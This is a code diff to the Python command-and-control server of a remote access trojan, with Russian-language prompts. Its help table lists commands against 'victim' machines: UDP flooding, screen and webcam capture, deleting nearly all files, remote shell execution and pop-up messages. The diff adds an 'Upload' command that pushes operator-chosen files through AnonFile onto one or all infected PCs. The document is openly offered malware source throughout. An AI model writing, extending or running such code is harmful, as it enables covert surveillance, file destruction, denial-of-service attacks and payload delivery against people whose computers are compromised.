@@ -1,5 +1,6 @@
 import threading, os, time, socket, sys
 from colorama import Fore, init
+from isort import file
 from prettytable import PrettyTable
 from anonfile import AnonFile
 init()
@@ -48,6 +49,7 @@ if __name__ == "__main__":
               conn.send(str.encode('check'))
         except:
              conns.remove(conn)   
+             pass
         if command == 'help' or command == 'Help':
             helpcomm = PrettyTable(['Команда', 'Описание', 'Использование'])
             helpcomm.add_row(['UDP Flood', 'UDP флуд', 'Udpflood'])
@@ -55,6 +57,7 @@ if __name__ == "__main__":
             helpcomm.add_row(['Screen', 'Скриншот экрана жертвы', 'Screen [Ip Жертвы/all]'])
             helpcomm.add_row(['Webcam', 'Скриншот с вебкамеры', 'Webcam [Ip Жертвы/all]'])
             helpcomm.add_row(['Delete All', 'Удаляет почти все файлы', 'Dall [Ip Жертвы/all]'])
+            helpcomm.add_row(['Upload', 'Загружает файлы на ПК жертвы', 'Upload [Ip Жертвы/all]'])
             helpcomm.add_row(['Text To Speech', 'Преобразует текст в речь', 'Tts [Ip Жертвы/all]'])
             helpcomm.add_row(['Message Box', 'Отправляет сообщение на экран жертвы', 'Msgbox [Ip Жертвы/all]'])
             helpcomm.add_row(['Shell', 'Выполняет консольные команды', 'Shell [Ip Жертвы/all]'])
@@ -67,6 +70,44 @@ if __name__ == "__main__":
             print(helpcomm)
  
  
+        elif command.startswith('Upload') or command.startswith('upload'):
+            iparg = command[4:]
+            if int(len(iparg)) < 3:
+                print('[-] Укажите IP')
+                return cmds()   
+            anon = AnonFile()            
+            iparg = command[7:]
+            if iparg == 'all' or iparg == 'All':
+             for conn in conns:
+                try: 
+                 conn.send(str.encode('upload'))
+                except Exception as e:
+                    print(e) 
+             filel = input('Укажите файл: ~# ')
+             upload = anon.upload(filel)
+             for conn in conns:
+                try: 
+                 conn.send(str.encode(upload.url.geturl()))
+                except Exception as e:
+                    print(e)              
+             print('[+] Команда отправлена')    
+            else:
+                for conn in conns:
+                    if conn.getpeername()[0] == iparg:
+                        try:    
+                         conn.send(str.encode('upload'))
+                        except Exception as e:
+                            print(e)  
+                filel = input('Укажите файл: ~# ')
+                upload = anon.upload(filel)
+                for conn in conns:
+                    if conn.getpeername()[0] == iparg:
+                        try:
+                            conn.send(str.encode(upload.url.geturl()))
+                        except Exception as e:
+                            print(e)    
+
+
         elif command == 'Clear' or command == 'clear' or command == 'cls' or command == 'Cls':
             cls()
             logo()
@@ -81,7 +122,7 @@ if __name__ == "__main__":
                  conn.send(str.encode('tts'))    
                 except Exception as e:
                     print(e) 
-              ttstext = input('Сообщение: ')
+              ttstext = input('Сообщение: ~# ')
               for conn in conns:
                 try:
                     conn.send(str.encode(ttstext))
@@ -94,7 +135,7 @@ if __name__ == "__main__":
                        conn.send(str.encode('tts'))    
                       except Exception as e:
                        print(e)
-                ttstext = input('Сообщение: ')                          
+                ttstext = input('Сообщение: ~# ')                          
                 for conn in conns:
                      if conn.getpeername()[0] == iparg:   
                       try:
@@ -134,8 +175,8 @@ if __name__ == "__main__":
                  conn.send(str.encode('msgbox'))    
                 except Exception as e:
                     print(e)          
-              title = input('Заголовок: ')
-              message = input('Сообщение: ')      
+              title = input('Заголовок: ~# ')
+              message = input('Сообщение: ~# ')      
               for conn in conns:
                 conn.send(str.encode(title))
                 conn.send(str.encode(message))
@@ -146,8 +187,8 @@ if __name__ == "__main__":
                        conn.send(str.encode('msgbox'))    
                       except Exception as e:
                        print(e)
-                title = input('Заголовок: ')
-                message = input('Сообщение: ')                          
+                title = input('Заголовок: ~#')
+                message = input('Сообщение: ~# ')                          
                 for conn in conns:
                      if conn.getpeername()[0] == iparg:   
                       try:
@@ -362,7 +403,7 @@ if __name__ == "__main__":
                   city = str(conn.recv(1024), 'utf-8')
                   ipaddr = str(conn.getpeername()[0])
                  except Exception as e:       
-                     pass
+                     print(e)
                      usern = 'Error'
                      pcname = 'Error'
                      city = 'Error'
